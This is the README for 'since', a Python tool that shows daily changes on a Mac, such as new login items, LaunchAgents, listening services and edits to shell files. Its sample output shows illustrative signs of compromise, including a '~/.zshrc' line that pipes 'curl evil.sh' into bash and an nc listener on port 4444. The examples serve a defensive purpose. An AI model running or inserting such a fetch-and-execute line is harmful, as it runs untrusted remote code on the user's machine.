# since

**A plain-language daily diff of your Mac.** One command that answers:

> *What's different about my computer since I last looked?*

`since` snapshots the things that quietly change under you and shows you the delta in
human language — great for catching **both** malware persistence **and** your own
forgotten `brew install` from three weeks ago.

```
since — what changed on this Mac
baseline Thu 23 Jul 09:00  →  now Fri 24 Jul 09:00   (about 25 hours)

⚠  Worth a look
   • NEW login items: SketchyHelper
   • NEW startup/background jobs: ~/Library/LaunchAgents/com.evil.persist.plist
   • NEW listening network services: nc listening on port(s) 4444
   • EDITED: ~/.zshrc

System files
   ~/.zshrc (edited)
      +curl evil.sh | bash

Homebrew packages
   + installed  fzf 0.54
   ~ changed    jq 1.6 → 1.7
   - removed    cowsay 3.04

Big new files
      1.4 GB  ~/Downloads/ubuntu.iso
   (visible folders only — hidden/app-data dirs like ~/Library are skipped)
```

## What it watches

| Category | What & why |
|---|---|
| **Login items** | "Open at Login" apps — a classic persistence spot |
| **Startup/background jobs** | LaunchAgents & LaunchDaemons (new *or modified* plists) |
| **Listening network services** | Processes accepting TCP connections — a new one is the signal (a reverse shell, an unexpected server) |
| **System extensions** | Third-party network filters / endpoint agents |
| **System files** | `~/.zshrc` & friends, `/etc/hosts`, cron — shown as an actual line-level diff |
| **Homebrew / npm / Applications** | What software came and went |
| **Big new files** | Biggest files created since the baseline, in your visible folders |

## Design choices worth knowing

- **Listening services are keyed by process, not port.** Daemons like `rapportd`
  rebind random high ports every boot; keying by port would cry wolf daily. A
  genuinely *new listening process* is what surfaces.
- **Big-file scan skips hidden/app-data dirs** (`~/Library`, `.git`, `.cache`,
  VM disk images, LLM transcripts…). It looks where *you* put files. This is
  stated in the output, not hidden.
- **Zero dependencies, no sudo.** Pure Python 3 stdlib + macOS tools.
- **Your snapshots stay private.** They live in `~/.local/state/since/`
  (mode `600`), never in this repo. They describe your machine — treat them
  as sensitive.

## Install

```sh
./install.sh
```

This symlinks `since` into `~/.local/bin` and offers to install a daily
LaunchAgent that takes a snapshot every morning — which is what makes
"since yesterday" meaningful. (Make sure `~/.local/bin` is on your `PATH`.)

## Usage

```sh
since                 # diff live state vs the most recent snapshot, then save one
since --since 1d      # diff against the newest snapshot at least 1 day old
since --since 7d      # "what changed this week"
since --no-save       # peek without saving a new snapshot
since snapshot        # just capture a snapshot (this is what the daily job runs)
since list            # list saved snapshots
since --json          # machine-readable diff
```

**First run** establishes a baseline (nothing to compare yet). Run it again after
installing something, or tomorrow, to see the diff.

## How it decides "changed"

Each snapshot is a JSON fingerprint per category. A diff is added / removed /
changed keys. For system files it stores the text and shows a real `diff`, so you
see the exact line someone (or something) added to your `~/.zshrc`.

## Limitations (honest ones)

- Login items via `System Events` cover the modern "Open at Login" list; the full
  Background Task Management database (`sfltool dumpbtm`) needs `sudo` and isn't
  read yet — see `PENDING.md`.
- Only TCP listeners are tracked (not UDP). New listening *ports* on an
  already-known process are intentionally not flagged.
- The big-file scan is bounded (visible dirs, `> 25 MB`); it is not a full disk audit.

Not a replacement for a real EDR/antivirus — it's a **friendly daily awareness
tool** that makes silent changes visible.
